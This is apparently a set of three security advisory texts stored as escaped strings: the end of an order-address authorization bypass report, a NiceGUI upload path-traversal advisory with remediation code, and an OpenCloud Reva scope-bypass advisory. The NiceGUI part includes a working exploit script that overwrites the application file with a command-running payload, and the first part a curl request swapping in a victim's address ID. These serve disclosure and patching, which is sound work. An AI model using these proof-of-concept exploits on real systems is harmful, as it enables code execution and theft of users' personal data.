--data-urlencode \"authenticity_token=${CSRF_TOKEN}\" \\\n  --data-urlencode \"order[ship_address_id]=${VICTIM_ADDRESS_ID}\" \\\n  \"http://localhost:3000/checkout/${ATTACKER_ORDER_TOKEN}/update/address\"\n```\n\nExpected Result: Attacker's order now references victim's address. Through that the attacker has all address details in full display.\nThis can be verified by accessing  `/checkout/${ATTACKER_ORDER_TOKEN}/delivery` in the same browser where you created the new guest cart.\n\n#### Impact\n\nThis issue may lead to disclosure of PII of guest users (including names, addresses and phone numbers).\n\n#### CWEs\n\n- CWE-639: Authorization Bypass Through User-Controlled Key\n- CWE-284: Improper Access Control\n\n### Credit\n\nThis issue was discovered with the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) and manually verified by GHSL team members [@p- (Peter Stöckli)](https://github.com/p-) and [@m-y-mo (Man Yue Mo)](https://github.com/m-y-mo).\n\n### Disclosure Policy\n\nThis report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).",

Malicious filenames containing `../` sequences allow attackers to write files outside intended directories, with potential for remote code execution through application file overwrites in vulnerable deployment patterns. This design creates a prevalent security footgun affecting applications following common community patterns.\n\n**Note**: Exploitation requires application code incorporating `file.name` into filesystem paths without sanitization. Applications using fixed paths, generated filenames, or explicit sanitization are not affected.\n\n### Details\n**Vulnerable Component**: `nicegui/elements/upload_files.py` ([upload_files.py#L79-L82](https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L79-L82) and [upload_files.py#L110-L115](https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L110-L115))\n\n**Affected Methods**: `SmallFileUpload.save()`and `LargeFileUpload.save()`\n\n```py\nasync def save(self, path: str | Path) -> None:\n    target = Path(path)\n    target.parent.mkdir(parents=True, exist_ok=True)\n    await run.io_bound(target.write_bytes, self._data)\n```\n\n**Root Cause**: The `save()` method performs no validation on the provided path parameter. It accepts:\n- Relative paths with `../` sequences\n- Absolute paths\n- Any file system location writable by the process\n\nWhen developers use `e.file.name` (controlled by the attacker) in constructing save paths, directory traversal occurs:\n```py\nsave_path = UPLOAD_DIR / e.file.name  # e.file.name = \"../app.py\"\nawait e.file.save(save_path)           # Writes outside UPLOAD_DIR\n```\n\n### PoC\n- Terminal 1 (App)\n```bash\ncd /tmp && mkdir -p evilgui && cd evilgui\npython3 -m venv evilgui && source evilgui/bin/activate\npip install nicegui\n\ncat > vulnerable_app.py << 'EOF'\nfrom nicegui import ui\nfrom pathlib import Path\n\nUPLOAD_DIR = Path('./uploads')\nUPLOAD_DIR.mkdir(exist_ok=True)\n\n@ui.page('/')\ndef index():\n    async def handle_upload(e):\n        save_path = UPLOAD_DIR / e.file.name\n        await e.file.save(save_path)\n        ui.notify(f'File saved: {e.file.name}')\n    \n    ui.upload(on_upload=handle_upload, auto_upload=True)\n\nui.run(port=8080, reload=False)\nEOF\n\npython3 vulnerable_app.py &\n```\n\n- Terminal 2 (Exploit)\n```bash\ncat > exploit.py << 'EOF'\nimport requests, re, time\n\ns = requests.Session()\ns.get('http://localhost:8080')\ntime.sleep(2)\n\nhtml = s.get('http://localhost:8080').text\nmatch = re.search(r'/_nicegui/client/([^/]+)/upload/(\\d+)', html)\nupload_url = f'http://localhost:8080/_nicegui/client/{match[1]}/upload/{match[2]}'\n\npayload = '''from nicegui import ui\nimport subprocess\n@ui.page(\"/\")\ndef index():\n    ui.label(subprocess.check_output([\"id\"], text=True))\nui.run(port=8080, reload=False)\n'''\n\ns.post(upload_url, files={'file': ('../vulnerable_app.py', payload, 'text/x-python')})\nEOF\n\npython3 exploit.py\n```\n- Restart the application to execute the injected code:\n```\npkill -f vulnerable_app && python3 vulnerable_app.py\n```\n- Observe http://localhost:8080\n\n### Impact\n**Affected Applications**: All NiceGUI applications using `ui.upload()` where developers save files with `e.file.save()` and include user-controlled filenames (e.g., `e.file.name`) in the path.\n\n**Attack Capabilities**:\n- Write files to any location writable by the application process\n- Overwrite Python application files to achieve remote code execution upon restart\n- Overwrite configuration files to alter application behavior\n- Write SSH keys, systemd units, or cron jobs for persistent access\n- Deny service by corrupting critical files\n\n**Exploitability**: Trivially exploitable without authentication. Attackers simply upload a file with a malicious filename like `../../../app.py` to escape the upload directory. The vulnerability is prevalent in production applications as developers naturally use `e.file.name` directly, following patterns shown in community examples.\n\n### Remediation\n#### For Users\n```py\nasync def handle_upload(e):\n    safe_name = Path(e.file.name).name # Strip directory components!\n    await e.file.save(UPLOAD_DIR / safe_name)\n```\n\n#### For Maintainers\n```py\nasync def save(self, path: str | Path, *, base_dir: Path | None = None) -> None:\n    target = Path(path).resolve()\n    \n    if base_dir is not None:\n        base_dir = base_dir.resolve()\n        if not target.is_relative_to(base_dir):\n            raise ValueError(\n                f\"Path '{target}' escapes base directory '{base_dir}'\"\n            )\n    \n    target.parent.mkdir(parents=True, exist_ok=True)\n    await run.io_bound(target.write_bytes, self._data)\n````",

Anonymous users accessing resources via this public link share are only allowed to access the share resource itself and, in case of a directory or space root, all child resources of it.\n\nDue to a bug in the GRPC authorization middleware of the \"Reva\" component of OpenCloud a malicious user is able to bypass the scope verification. By exploiting this via the the \"archiver\" service this can be leveraged to create an archive (zip or tar-file) containing all resources that this creator of the public link has access to.\n\nIt is not possible to bypass the public link scope via \"normal\" WebDAV requests so it is not possible to exploit this vulnerability via WebDAV.\n\n### Patches\n\nUpdate to OpenCloud Reva version >= 2.40.3 for the 2.40.x versions.\\\nUpdate to OpenCloud Reva version >= 2.42.3 for the 2.41.x versions\n\n### Workarounds\n\nThere is no workaround because one cannot run Reva standalone from this project. Please check the [OpenCloud Advisory](https://github.com/opencloud-eu/opencloud/security/advisories/GHSA-vf5j-r2hw-2hrw) how to mitigate the problem in an OpenCloud deployment via configuration.\n\n### For more information\n\nIf there are any questions or comments about this advisory:\n\n- Security Support: [security@opencloud.eu](mailto:security@opencloud.eu)\n- Technical Support: [support@opencloud.eu](mailto:support@opencloud.eu)",
